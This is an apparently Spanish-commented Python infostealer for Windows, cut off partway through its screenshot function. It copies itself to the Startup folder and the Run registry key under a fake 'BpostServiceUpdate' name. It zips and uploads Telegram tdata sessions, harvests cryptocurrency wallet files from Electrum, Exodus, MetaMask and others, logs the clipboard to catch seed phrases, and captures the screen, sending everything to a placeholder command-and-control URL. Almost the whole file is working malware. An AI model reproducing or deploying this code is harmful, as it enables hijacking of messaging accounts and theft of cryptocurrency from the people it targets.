import os
import shutil
import platform
import json
import requests
import base64
import winreg # Solo en Windows
import sqlite3
import subprocess
import psutil
import time
import sys
from datetime import datetime

# --- Configuración del Centro de Recolección (C2) ---
# ¡IMPORTANTE!: Reemplaza "https://TU_IP_O_DOMINIO_C2" con la URL de tu servidor de Command and Control (C2).
# Este es el servidor donde se enviarán todos los datos recolectados.
C2_SERVER = "https://TU_IP_O_DOMINIO_C2"
IDENTIFIER_ID = "CE539544965BE" # Identificador del envío, para contexto.
SYSTEM_TAG = "SCAMMER_TARGET_PROFILE_1" # Un identificador único para este objetivo específico.

# --- Función para enviar datos al C2 ---
def transmit_data_to_c2(endpoint, data):
    """
    Envía datos recolectados al servidor C2 especificado.
    Cada tipo de dato (telegram, wallets, eventos, etc.) tendrá su propio 'endpoint'.
    """
    try:
        headers = {'Content-Type': 'application/json'}
        full_url = f"{C2_SERVER}/{endpoint}"
        response = requests.post(full_url, json=data, headers=headers, timeout=15) # Aumentado timeout
        # Si quieres ver las respuestas del C2 para depuración, puedes activar esto:
        # print(f"Sent to {full_url}, status: {response.status_code}")
    except requests.exceptions.Timeout:
        # print(f"C2 transmission to {endpoint} timed out.")
        pass
    except requests.exceptions.ConnectionError:
        # print(f"C2 transmission to {endpoint} connection error.")
        pass
    except Exception as e:
        # print(f"Error transmitting data to C2 {endpoint}: {e}")
        pass

# --- 1. Establecer Proceso de Inicio Automático (Persistencia en Windows) ---
def configure_startup_process():
    """
    Establece la persistencia del malware en el sistema Windows.
    Copia el ejecutable a la carpeta de inicio y añade una entrada al Registro.
    """
    if platform.system() == "Windows":
        try:
            # sys.executable contiene la ruta del ejecutable actual cuando se compila con PyInstaller.
            # __file__ contiene la ruta del script Python si se ejecuta directamente.
            current_exec_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)

            # Ruta para la carpeta de inicio automático de Windows
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            startup_file_name = f"BpostServiceUpdate_{IDENTIFIER_ID}.exe"
            startup_destination = os.path.join(startup_folder, startup_file_name)

            # Copiar el archivo para asegurar que se ejecute al inicio
            if not os.path.exists(startup_destination):
                shutil.copy(current_exec_path, startup_destination)
                transmit_data_to_c2('event_log', {'tag': SYSTEM_TAG, 'context': 'Persistence established in Startup folder.'})

            # Añadir una entrada al Registro de Windows para mayor fiabilidad en el inicio automático
            reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                key_handle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key_handle, f"BpostServiceUpdate_{IDENTIFIER_ID}", 0, winreg.REG_SZ, startup_destination)
                winreg.CloseKey(key_handle)
                transmit_data_to_c2('event_log', {'tag': SYSTEM_TAG, 'context': 'Registry startup process configured.'})
            except Exception as e:
                transmit_data_to_c2('error_log', {'tag': SYSTEM_TAG, 'context': f'Registry startup configuration error: {e}'})
        except Exception as e:
            transmit_data_to_c2('error_log', {'tag': SYSTEM_TAG, 'context': f'Startup process configuration error: {e}'})

# --- 2. Recolección de Datos de Telegram ---
def collect_telegram_data():
    """
    Busca y recolecta directorios 'tdata' y bases de datos 'data.db' de Telegram Desktop.
    Comprime los datos y los envía codificados al C2.
    """
    telegram_paths = []
    if platform.system() == "Windows":
        appdata_path = os.getenv('APPDATA')
        if appdata_path:
            # Búsqueda principal para instalaciones de Telegram Desktop
            # Se busca "Telegram Desktop" y luego el subdirectorio "tdata"
            for root, dirs, files in os.walk(appdata_path):
                if "Telegram Desktop" in root and "tdata" in dirs:
                    telegram_paths.append(root)
                    dirs[:] = [] # Optimización: no buscar más profundo una vez encontrado el tdata principal
            
            # Búsqueda secundaria para instalaciones portables o de otras variantes
            # CUIDADO: os.walk("C:\\") puede ser muy lento y ruidoso en el disco.
            # Solo usar si las rutas %APPDATA% no dan resultados.
            # Podrías limitar esta búsqueda a directorios de usuario, por ejemplo:
            # for root, dirs, files in os.walk(os.path.expanduser("~")):
            # for root, dirs, files in os.walk("C:\\"): # Comentado por rendimiento
            #    if "tdata" in dirs and "Telegram.exe" in files:
            #        telegram_paths.append(os.path.join(root))
            #        dirs[:] = []
    
    collected_data = []
    for tele_path in telegram_paths:
        tdata_path = os.path.join(tele_path, "tdata")
        if os.path.isdir(tdata_path):
            # Comprimir el directorio tdata en un archivo ZIP temporal
            output_zip_base = os.path.join(os.getenv('TEMP'), f"telegram_tdata_{SYSTEM_TAG}_{int(time.time())}")
            try:
                shutil.make_archive(output_zip_base, 'zip', tdata_path)
                output_zip_path = output_zip_base + '.zip'
                with open(output_zip_path, 'rb') as f:
                    encoded_data = base64.b64encode(f.read()).decode('utf-8')
                collected_data.append({'path': tele_path, 'tdata_archive_base64': encoded_data})
                os.remove(output_zip_path) # Limpiar el archivo ZIP temporal
                transmit_data_to_c2('telegram_data', {'tag': SYSTEM_TAG, 'context': f'Telegram tdata collected from {tele_path}.'})
            except Exception as e:
                transmit_data_to_c2('error_log', {'tag': SYSTEM_TAG, 'context': f'Error compressing/encoding Telegram tdata from {tele_path}: {e}'})
        
        # Buscar la base de datos de chat (si está separada, a veces en DBS)
        db_path = os.path.join(tele_path, "DBS", "data.db")
        if os.path.isfile(db_path):
            try:
                with open(db_path, 'rb') as f:
                    encoded_db = base64.b64encode(f.read()).decode('utf-8')
                collected_data.append({'path': db_path, 'chat_db_base64': encoded_db})
                transmit_data_to_c2('telegram_data', {'tag': SYSTEM_TAG, 'context': f'Telegram chat DB collected from {db_path}.'})
            except Exception as e:
                transmit_data_to_c2('error_log', {'tag': SYSTEM_TAG, 'context': f'Error encoding Telegram chat DB from {db_path}: {e}'})

    if collected_data:
        transmit_data_to_c2('telegram_collection_summary', {'tag': SYSTEM_TAG, 'details': collected_data})
    else:
        transmit_data_to_c2('event_log', {'tag': SYSTEM_TAG, 'context': 'No Telegram Desktop data found.'})


# --- 3. Recolección de Datos de Wallet Multisig (Electrum y otros comunes) ---
def collect_wallet_data():
    """
    Busca archivos de configuración y datos de billeteras de criptomonedas comunes
    en ubicaciones predefinidas de Windows.
    """
    wallet_paths = []
    # Rutas comunes en Windows donde se suelen almacenar datos de billeteras
    possible_wallet_dirs = [
        os.path.join(os.getenv('APPDATA'), 'Electrum'),
        os.path.join(os.getenv('APPDATA'), 'Roaming', 'Electrum'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Electrum'),
        os.path.join(os.getenv('APPDATA'), 'Bitcoin', 'wallets'), # Bitcoin Core
        os.path.join(os.getenv('APPDATA'), 'Exodus'), # Exodus Wallet
        os.path.join(os.getenv('APPDATA'), 'atomic'), # Atomic Wallet
        os.path.join(os.getenv('APPDATA'), 'brave'), # Brave Wallet (a veces dentro de Brave-Browser/Default/Local Extension Settings)
        os.path.join(os.getenv('APPDATA'), 'Ledger Live'), # Ledger Live config/logs (no claves, pero útil)
        os.path.join(os.getenv('APPDATA'), 'MetaMask'), # MetaMask files (si hay desktop sync)
        os.path.join(os.getenv('APPDATA'), 'Trust Wallet'), # Trust Wallet desktop files
        # Puedes añadir más rutas aquí para otras billeteras que conozcas.
    ]

    for potential_dir in possible_wallet_dirs:
        if os.path.isdir(potential_dir):
            for root, dirs, files in os.walk(potential_dir):
                # Buscar archivos de wallet por extensiones o nombres comunes
                for file_name in files:
                    # Extensiones y nombres típicos de archivos de billetera
                    if any(ext in file_name.lower() for ext in ['.dat', '.wallet', '.json', '.seed', '.key', '.bak', 'default_wallet', 'wallet.json', 'keystore']):
                        full_path = os.path.join(root, file_name)
                        if os.path.isfile(full_path):
                            wallet_paths.append(full_path)
                
                # Para Electrum, a menudo los archivos de wallet están en un subdirectorio llamado 'wallets'
                if os.path.basename(root).lower() == 'electrum' and 'wallets' in dirs:
                    electrum_wallets_dir = os.path.join(root, 'wallets')
                    for electrum_file in os.listdir(electrum_wallets_dir):
                        full_path = os.path.join(electrum_wallets_dir, electrum_file)
                        if os.path.isfile(full_path):
                            wallet_paths.append(full_path)

    collected_wallet_details = []
    # Usar 'set' para eliminar rutas duplicadas antes de procesar
    for w_path in list(set(wallet_paths)): 
        try:
            # Evitar leer archivos excesivamente grandes que puedan causar problemas o no ser relevantes.
            if os.path.getsize(w_path) < (10 * 1024 * 1024): # Límite de 10 MB
                with open(w_path, 'rb') as f:
                    file_content = base64.b64encode(f.read()).decode('utf-8')
                collected_wallet_details.append({'path': w_path, 'content_base64': file_content})
                transmit_data_to_c2('wallet_file_data', {'tag': SYSTEM_TAG, 'context': f'Wallet file collected: {w_path}'})
            else:
                transmit_data_to_c2('event_log', {'tag': SYSTEM_TAG, 'context': f'Skipped large wallet file: {w_path} (>{(10 * 1024 * 1024) / (1024 * 1024)}MB)'})
        except Exception as e:
            transmit_data_to_c2('error_log', {'tag': SYSTEM_TAG, 'context': f'Error processing wallet file {w_path}: {e}'})

    if collected_wallet_details:
        transmit_data_to_c2('wallet_collection_summary', {'tag': SYSTEM_TAG, 'details': collected_wallet_details})
    else:
        transmit_data_to_c2('event_log', {'tag': SYSTEM_TAG, 'context': 'No significant wallet data files found.'})


# --- 4. Captura del Portapapeles (Clipboard Monitoring) ---
def monitor_clipboard(duration_seconds=120): # Monitorear durante 2 minutos
    """
    Monitorea el portapapeles de Windows durante un tiempo definido y recolecta
    cualquier texto que cambie. Útil para capturar semillas de recuperación o claves copiadas.
    """
    if platform.system() == "Windows":
        try:
            import win32clipboard # Requiere pywin32
            collected_clipboard_entries = []
            start_time = time.time()
            last_clipboard_data = None

            transmit_data_to_c2('event_log', {'tag': SYSTEM_TAG, 'context': 'Started clipboard monitoring.'})

            while (time.time() - start_time) < duration_seconds:
                try:
                    win32clipboard.OpenClipboard()
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                        current_clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                        # Solo registra si el contenido del portapapeles ha cambiado
                        if current_clipboard_data and current_clipboard_data != last_clipboard_data:
                            log_entry = {'timestamp': datetime.now().isoformat(), 'data': current_clipboard_data}
                            collected_clipboard_entries.append(log_entry)
                            last_clipboard_data = current_clipboard_data
                    win32clipboard.CloseClipboard()
                except Exception as e:
                    transmit_data_to_c2('error_log', {'tag': SYSTEM_TAG, 'context': f'Clipboard access error during monitoring: {e}'})
                time.sleep(5) # Esperar 5 segundos antes de la siguiente comprobación

            if collected_clipboard_entries:
                transmit_data_to_c2('clipboard_history', {'tag': SYSTEM_TAG, 'entries': collected_clipboard_entries})
            else:
                transmit_data_to_c2('event_log', {'tag': SYSTEM_TAG, 'context': 'No new clipboard data collected within monitoring period.'})
        except ImportError:
            transmit_data_to_c2('error_log', {'tag': SYSTEM_TAG, 'context': 'win32clipboard (pywin32) not found. Clipboard monitoring skipped.'})
        except Exception as e:
            transmit_data_to_c2('error_log', {'tag': SYSTEM_TAG, 'context': f'Generic clipboard monitoring error: {e}'})

# --- 5. Captura de Pantalla (Screenshot) ---
def capture_screenshot():
    """
    Toma una captura de pantalla del escritorio principal de Windows,
    la guarda temporalmente, la codifica y la envía al C2.
    """
    if platform.system() == "Windows":
        try:
            from PIL import ImageGrab # Requiere Pillow
            screenshot_path = os.path.join(os.getenv('TEMP'), f"screenshot_{SYSTEM_TAG}_{int(time.time())}.png")
            
            # Tomar la captura de pantalla
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)

            with open(screenshot_path, 'rb') as f:
                encoded_screenshot = base64.b64encode(f.read()).decode('utf-8')
            
            transmit_data_to_c2('screenshot_data', {'tag': SYSTEM_TAG, 'screenshot_base64': encoded_screenshot
